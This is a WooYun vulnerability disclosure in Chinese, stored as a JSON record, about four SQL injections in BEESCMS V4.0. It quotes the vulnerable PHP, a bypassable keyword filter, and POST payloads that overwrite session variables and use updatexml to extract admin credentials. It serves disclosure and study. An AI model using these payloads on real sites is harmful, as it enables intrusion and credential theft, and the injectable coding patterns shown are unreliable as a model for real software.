{"id": 84824, "wybug_id": "wooyun-2015-0141182", "wybug_title": "BEESCMS四处注入&amp;&amp;某设计缺陷&amp;&amp;无视防御", "wybug_corp": "beescms.com", "wybug_author": "牛肉包子", "wybug_date": "2015-09-15 18:25", "wybug_open_date": "2015-12-19 18:27", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-20：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-11-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-19：\t细节向公众公开  简要描述： BEESCMS V4.0_R_20150708 最新版 详细说明：  看到includes\\init.php\nif(!defined('CMS')){die('Hacking attempt');}error_reporting(E_ALL & ~E_NOTICE);define('CMS_PATH',str_replace('includes','',str_replace('\\\\','/',dirname(__FILE__))));define('INC_PATH',CMS_PATH.'includes/');define('DATA_PATH',CMS_PATH.'data/');define('LANG_PATH',CMS_PATH.'languages/');define('MB_PATH',CMS_PATH.'member/');define('TP_PATH',CMS_PATH.'template/');@ini_set('date.timezone','Asia/Shanghai');@ini_set('display_errors',1);@ini_set('session.use_trans_sid', 0);@ini_set('session.auto_start',    0);@ini_set('session.use_cookies',   1);@ini_set('memory_limit',          '64M');@ini_set('session.cache_expire',  180);session_start();header(\"Content-type: text/html; charset=utf-8\"); @include(INC_PATH.'fun.php');unset($HTTP_ENV_VARS, $HTTP_POST_VARS, $HTTP_GET_VARS, $HTTP_POST_FILES, $HTTP_COOKIE_VARS);if (!get_magic_quotes_gpc()){    if (isset($_REQUEST))    {        $_REQUEST  = addsl($_REQUEST);    }    $_COOKIE   = addsl($_COOKIE);\t$_POST = addsl($_POST);\t$_GET = addsl($_GET);}if (isset($_REQUEST)){$_REQUEST  = fl_value($_REQUEST);}    $_COOKIE   = fl_value($_COOKIE);\t$_GET = fl_value($_GET);@extract($_POST);@extract($_GET);@extract($_COOKIE);@include(DATA_PATH.'confing.php');$cms_url='http://'.$_SERVER['HTTP_HOST'].CMS_SELF;define('CMS_URL',$cms_url);\n上面那段代码里面就是一个伪全局变量注册，还有个防注入的函数。\nfunction fl_value($str){\tif(empty($str)){return;}\treturn preg_replace('/select|insert | update | and | in | on | left | joins | delete |\\%|\\=|\\/\\*|\\*|\\.\\.\\/|\\.\\/| union | from | where | group | into |load_file|outfile/i','',$str);}\n我们用大小写就可以绕过了。然后看到mx_form/mx_form.php\ndefine('CMS',true);require_once('../includes/init.php');require_once('../includes/fun.php');require_once('../includes/lib.php');//载入模板调用函数，不载入该文件不能使用函数$id=intval($_GET['id']);$cate_info=get_cate_info($id,$category);$channel_info=get_cate_info($cate_info['cate_channel'],$channel);//获得内容模型信息if(empty($cate_info)){header('location:../index.php');}$lang=$cate_info['lang'];if(file_exists(LANG_PATH.'lang_'.$lang.'.php')){include(LANG_PATH.'lang_'.$lang.'.php');}//语言包缓存,数组$languageif(file_exists(DATA_PATH.'cache_cate/cate_list_'.$lang.'.php')){include(DATA_PATH.'cache_cate/cate_list_'.$lang.'.php');}//当前语言下的栏目var_dump($_SESSION);$_confing=get_confing($lang);//配置信息$cat_id=$cate_info['id'];//栏目id$cateid=$cat_id;$parent_id=get_cate_last_parent($cat_id);//获取最终顶级栏目\n包含了这个文件，所以我们可以通过GPC覆盖变量的值。然后在这个cms里面有很多没有初始化的变量，通过这个设计缺陷。我们可以来注入。注入1member\\member.php\nelseif($action=='main'){\t//var_dump($_SESSION);\t$url=$language['member_msg28'];\t$tpl->assign('position',get_dy_position($url));//位置\tif(empty($_SESSION['member_user'])||empty($_SESSION['member_id'])||empty($_SESSION['member_login'])){die('<script type=\"text/javascript\">location.href=\\'?action=login&lang='.$lang.'\\';</script>');}\t$purview=$language['member_msg31'];\tif($_SESSION['member_purview']){\t\t$sql=\"select member_group_name from \".DB_PRE.\"member_group where id={$_SESSION['member_purview']}\"; //注入1\t\t$rel=$GLOBALS['mysql']->fetch_asc($sql);\t\t$purview=$rel[0]['member_group_name'];\t\tunset($rel);\t}\t$sql=\"select*from \".DB_PRE.\"member where id=\".intval($_SESSION['member_id']);\t$rel=$GLOBALS['mysql']->fetch_asc($sql);\t$sql=\"select count(*) as ask,member from \".DB_PRE.\"ask where member=\".$rel[0]['id'].\" group by member\";\t$arr=$GLOBALS['mysql']->fetch_asc($sql);\t$ask_count=isset($arr[0]['ask'])?$arr[0]['ask']:'';\tunset($arr);\t$tpl->assign('ask_count',$ask_count);\t$tpl->assign('login_time',date('Y-m-d H:m:s',$rel[0]['member_time']));\t$tpl->assign('login_ip',$rel[0]['member_ip']);\t$tpl->assign('login_count',$rel[0]['member_count']);\t$tpl->assign('purview',$purview);\t$tpl->assign('member',$_SESSION['member_user']);\t$tpl->display('member_login');}\n其中{$_SESSION['member_purview']}没有单引号包裹，所以造成注入。首先访问\n**.**.**.**/beescms/mx_form/mx_form.php?id=12\n设置一次session里面的值\n\n然后访问\n**.**.**.**/beescms/member/member.php?action=main&lang=cn\n\n\n注入二\nelseif($action=='info'){\t$url=$language['member_msg28'];\t$tpl->assign('position',get_dy_position($url));//位置\tif(empty($_SESSION['member_user'])||empty($_SESSION['member_id'])||empty($_SESSION['member_login'])){die('<script type=\"text/javascript\">location.href=\\'?action=login&lang='.$lang.'\\';</script>');}\t$sql=\"select*from \".DB_PRE.\"member where id=\".$_SESSION['member_id']; //注入2\t$rel=$GLOBALS['mysql']->fetch_asc($sql);\tif(!empty($rel[0]['member_birth'])){$arr=explode('-',$rel[0]['member_birth']);}\t$tpl->assign('year',isset($arr['0'])?$arr['0']:'');\t$tpl->assign('month',isset($arr['1'])?$arr['1']:'');\t$tpl->assign('day',isset($arr['2'])?$arr['2']:'');\t$tpl->assign('info',$rel[0]);\t$tpl->display('member_login');}\n通过$_SESSION['member_id']来注入首先\n**.**.**.**/beescms/mx_form/mx_form.php?id=12\npost数据\n_SESSION[member_user]=tomato&_SESSION[member_login]=true&_SESSION[member_id]=updatexml(1,concat(0x5c,(Select group_concat(admin_name,0x5c,admin_password) from bees_admin)),1)\n然后访问\n**.**.**.**/beescms/member/member.php?action=info&lang=cn\n\n\n注入3\nelseif($action=='save_info'){\tif(empty($_SESSION['member_user'])||empty($_SESSION['member_id'])||empty($_SESSION['member_login'])){die('<script type=\"text/javascript\">location.href=\\'?action=login&lang='.$lang.'\\';</script>');}\t$birthdayYear=fl_html(fl_value(intval($_POST['birthdayYear'])));\t$birthdayMonth=fl_html(fl_value(intval($_POST['birthdayMonth'])));\t$birthdayDay=fl_html(fl_value(intval($_POST['birthdayDay'])));\t$sex=fl_html(fl_value(intval($_POST['sex'])));\t$sex=empty($sex)?0:$sex;\t$mail=fl_html(fl_value($_POST['mail']));\t$qq=fl_html(fl_value($_POST['qq']));\t$tel=fl_html(fl_value($_POST['tel']));\t$phone=fl_html(fl_value($_POST['phone']));\t$submit=$_POST['submit'];\tif(!empty($qq)){\tif(!check_str($qq,'/^[1-9][0-9]*$/')){die(\"<script type=\\\"text/javascript\\\">alert('{$language['member_msg15']}');history.go(-1);</script>\");}\t}\tif(!empty($phone)){\tif(!check_str($phone,'/^[1-9][0-9]*$/')){die(\"<script type=\\\"text/javascript\\\">alert('{$language['member_msg16']}');history.go(-1);</script>\");}\t}\tif(empty($submit)){die(\"<script type=\\\"text/javascript\\\">alert('{$language['member_msg17']}');history.go(-1);</script>\");}\t$birth=$birthdayYear.'-'.$birthdayMonth.'-'.$birthdayDay;\t$sql=\"update \".DB_PRE.\"member set member_tel='{$tel}',member_phone='{$phone}',member_birth='{$birth}',member_sex =\".$sex.\",member_qq='{$qq}' where id={$_SESSION['member_id']}\"; //注入3\t$GLOBALS['mysql']->query($sql);\tdie(\"<script type=\\\"text/javascript\\\">alert('{$language['member_msg18']}');history.go(-1);</script>\");}\n\n$sql=\"update \".DB_PRE.\"member set member_tel='{$tel}',member_phone='{$phone}',member_birth='{$birth}',member_sex =\".$sex.\",member_qq='{$qq}' where id={$_SESSION['member_id']}\";\n其中{$_SESSION['member_id']}可以注入\n**.**.**.**/beescms/member/member.php?action=save_info&lang=cn\n我们post数据\n_SESSION[member_purview]=updatexml(1,concat(0x5c,(Select group_concat(admin_name,0x5c,admin_password) from bees_admin)),1)&_SESSION[member_user]=tomato&_SESSION[member_login]=true&_SESSION[member_id]=updatexml(1,concat(0x5c,(Select group_concat(admin_name,0x5c,admin_password) from bees_admin)),1)&submit=xxxx\n\n\n注入4\nelseif($action=='save_password'){\tif(empty($_SESSION['member_user'])||empty($_SESSION['member_id'])||empty($_SESSION['member_login'])){die('<script type=\"text/javascript\">location.href=\\'?action=login&lang='.$lang.'\\';</script>');}\t$password_use=trim(fl_html(fl_value($_POST['password_use'])));\t$password_new=trim(fl_html(fl_value($_POST['password_new'])));\t$password_new2=trim(fl_html(fl_value($_POST['password_new2'])));\tif(empty($password_use)||empty($password_new)||empty($password_new2)){die(\"<script type=\\\"text/javascript\\\">alert('{$language['member_msg8']}');history.go(-1);</script>\");}\t$sql=\"select member_password  from \".DB_PRE.\"member where id=\".$_SESSION['member_id'];\t$rel=$GLOBALS['mysql']->get_row($sql);\tif(md5($password_use)!=$rel){die(\"<script type=\\\"text/javascript\\\">alert('{$language['member_msg26']}');history.go(-1);</script>\");}\tif($password_new!=$password_new2){die(\"<script type=\\\"text/javascript\\\">alert('{$language['member_msg9']}');history.go(-1);</script>\");}\t$sql=\"update \".DB_PRE.\"member set member_password='\".md5($password_new).\"' where id=\".$_SESSION['member_id']; //注入4\t$GLOBALS['mysql']->query($sql);\tdie(\"<script type=\\\"text/javascript\\\">alert('{$language['member_msg18']}');history.go(-1);</script>\");}\n这段代码\n$sql=\"update \".DB_PRE.\"member set member_password='\".md5($password_new).\"' where id=\".$_SESSION['member_id'];\n\n**.**.**.**/beescms/member/member.php?action=save_password&lang=cn\n我们post数据\n_SESSION[member_user]=tomato&_SESSION[member_login]=true&_SESSION[member_id]=updatexml(1,concat(0x5c,(Select group_concat(admin_name,0x5c,admin_password) from bees_admin)),1)&password_use=xxxx&password_new=111&password_new2=xxxx\n\n\n由于$_SESSION[member_id]可控，所以可以造成大量的越权。   漏洞证明：  \n\n\n\n\n\n   修复方案：  你们专业   版权声明：转载请注明来源 牛肉包子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-12-19 18:27 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-09-15 19:09 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:372 漏洞数:109        )\t\t \n  2k get    \n     2015-09-15 19:23 |    \t\tanswer  \t\t\t( 普通白帽子  |\t\t\t        Rank:413 漏洞数:51        | 答案)\t\t \n  2k get    \n     2015-09-15 19:40 |    \t\tSword \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:11        | 求大牛带飞)\t\t \n  你关注的白帽子牛肉包子发表了一个漏洞    \n     2015-09-16 10:10 |    \t\tsco4x0 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:13        | O_o)\t\t \n  你关注的师傅牛肉包子发表了一个2k的漏洞    \n     2015-10-14 12:20 |    \t\t康小泡 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 掉个offer给我吧)\t\t \n  你关注的师傅牛肉包子发表了一个2k的漏洞    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}